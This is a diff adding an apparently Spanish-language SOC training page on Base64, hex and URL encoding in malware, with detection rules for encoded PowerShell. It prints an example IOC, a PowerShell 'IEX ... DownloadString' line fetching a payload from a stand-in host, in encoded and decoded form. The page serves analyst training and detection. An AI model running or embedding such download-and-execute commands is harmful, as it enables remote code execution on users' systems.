@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>01 — Codificación: Base64, Hex y el Malware</title>
+  <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+  <div class="container">
+<h1>01 — Codificación: Base64, Hex y el Malware</h1>
+
+<blockquote><strong>Slide relacionado:</strong> 03 de <code>crypto-soc-training.html</code></blockquote>
+
+<hr>
+
+<h2>¿Qué es la codificación?</h2>
+
+<p>La codificación convierte datos a un formato diferente para compatibilidad, transmisión o representación. <strong>No es seguridad.</strong> Cualquiera puede revertirlo.</p>
+
+<hr>
+
+<h2>Base64</h2>
+
+<h3>¿Cómo funciona?</h3>
+
+<p>Base64 toma bytes binarios y los representa usando solo 64 caracteres imprimibles: <code>A-Z</code>, <code>a-z</code>, <code>0-9</code>, <code>+</code>, <code>/</code>. El <code>=</code> al final es padding.</p>
+
+<pre><code>
+Input:  &quot;Hola SOC&quot;
+Output: &quot;SG9sYSBTT0M=&quot;
+</code></pre>
+
+<p>Cada 3 bytes de input → 4 caracteres Base64. Por eso el output siempre es ~33% más largo.</p>
+
+<h3>¿Por qué lo usa el malware?</h3>
+
+<ol>
+<li><strong>Evasión de AV:</strong> El payload en texto plano puede tener firmas conocidas. En Base64, no.</li>
+<li><strong>Ofuscación:</strong> Un analista desprevenido no lo lee directamente.</li>
+<li><strong>Compatibilidad:</strong> Permite enviar datos binarios por canales que solo aceptan texto (email, HTTP headers, scripts).</li>
+<li><strong>Multiples capas:</strong> El malware puede usar Base64 → Base64 → Base64 para dificultar análisis.</li>
+</ol>
+
+<h3>Detección en PowerShell (crítico para SOC)</h3>
+
+<pre><code>
+# Patrones que deben disparar alertas:
+powershell -enc &lt;base64&gt;
+powershell -EncodedCommand &lt;base64&gt;
+[System.Convert]::FromBase64String(&quot;...&quot;)
+[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&quot;...&quot;))
+</code></pre>
+
+<p><strong>Ejemplo de IOC real:</strong></p>
+<pre><code>
+cG93ZXJzaGVsbCAtZW5jb2RlZCBJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9tYWxpY2lvdXMuY29tL3BheWxvYWQnKQ==
+</code></pre>
+
+<p>Decodificado:</p>
+<pre><code>
+powershell -encoded IEX (New-Object Net.WebClient).DownloadString(&#x27;http://malicious.com/payload&#x27;)
+</code></pre>
+
+<h3>Cómo identificar Base64 a simple vista</h3>
+
+<ul>
+<li>Termina en <code>=</code> o <code>==</code> (padding)</li>
+<li>Solo contiene: <code>A-Z</code>, <code>a-z</code>, <code>0-9</code>, <code>+</code>, <code>/</code></li>
+<li>La longitud siempre es múltiplo de 4</li>
+<li>Parece &quot;texto random&quot; pero tiene distribución uniforme de caracteres</li>
+</ul>
+
+<hr>
+
+<h2>Hex (Base16)</h2>
+
+<h3>¿Cómo funciona?</h3>
+
+<p>Representa cada byte como dos dígitos hexadecimales: <code>0-9</code> y <code>A-F</code>.</p>
+
+<pre><code>
+Input:  &quot;SOC&quot;
+Output: &quot;534F43&quot;
+</code></pre>
+
+<h3>Uso en malware</h3>
+
+<ul>
+<li>Shellcode en scripts: <code>\x41\x42\x43</code> = &quot;ABC&quot;</li>
+<li>Hashes de archivos como IOCs</li>
+<li>Representación de IPs en registros de red</li>
+<li>Direcciones de memoria en dumps forenses</li>
+</ul>
+
+<h3>Cómo identificar Hex a simple vista</h3>
+
+<ul>
+<li>Solo contiene: <code>0-9</code>, <code>A-F</code> (case insensitive)</li>
+<li>La longitud siempre es par</li>
+<li>Puede tener prefijo <code>0x</code> o separadores <code>:</code></li>
+</ul>
+
+<hr>
+
+<h2>URL Encoding</h2>
+
+<pre><code>
+Input:  &quot;cmd.exe /c whoami&quot;
+Output: &quot;cmd.exe%20%2Fc%20whoami&quot;
+</code></pre>
+
+<p>Usado en inyecciones web, evasión de WAF, logs de servidores web.</p>
+
+<hr>
+
+<h2>Herramientas para decodificar rápido</h2>
+
+<table><thead><tr>
+<tr><th>Herramienta</th><th>Uso</th></tr>
+</tr></thead><tbody>
+<tr><td><a href="https://gchq.github.io/CyberChef/">CyberChef</a></td><td>Swiss army knife — decode visual en el browser</td></tr>
+<tr><td><code>base64 -d</code> (Linux)</td><td>`echo &quot;SG9sYQ==&quot; \</td><td>base64 -d`</td></tr>
+<tr><td>Python</td><td><code>import base64; base64.b64decode(&quot;SG9sYQ==&quot;)</code></td></tr>
+<tr><td>PowerShell</td><td><code>[System.Convert]::FromBase64String(&quot;SG9sYQ==&quot;)</code></td></tr>
+<tr><td><a href="https://de4js.kshift.me/">de4js</a></td><td>Deobfuscación de JavaScript</td></tr>
+</tbody></table>
+
+<hr>
+
+<h2>Relevancia SOC 🔍</h2>
+
+<h3>Reglas de detección (lógica, no Sigma específico)</h3>
+
+<pre><code>
+# SIEM: detectar PowerShell con encoding
+process_name = &quot;powershell.exe&quot;
+AND (
+  command_line CONTAINS &quot;-enc&quot; OR
+  command_line CONTAINS &quot;-EncodedCommand&quot; OR
+  command_line CONTAINS &quot;FromBase64String&quot;
+)
+
+# Longitud anómala del comando (payloads Base64 son largos)
+AND len(command_line) &gt; 1000
+</code></pre>
+
+<h3>Workflow de análisis</h3>
+
+<pre><code>
+Ver string sospechoso
+       ↓
+¿Solo tiene A-Za-z0-9+/= ?
+       ↓ SÍ
+¿Termina en = o == ?
+       ↓ SÍ
+Probablemente Base64 → decodificar con CyberChef
+       ↓
+¿El resultado es legible o binario?
+       ↓
+Legible → analizar el comando/payload
+Binario → puede ser otro layer o shellcode
+</code></pre>
+
+<hr>
+
+<h2>Próximo tema</h2>
+<p>→ <a href="./02_hashing.md">02_hashing.md</a> — Funciones hash y su uso forense</p>
+
+    <br><br>
+    <a href="../index.html">&#8592; Volver al inicio</a>
+  </div>
+</body>
+</html>
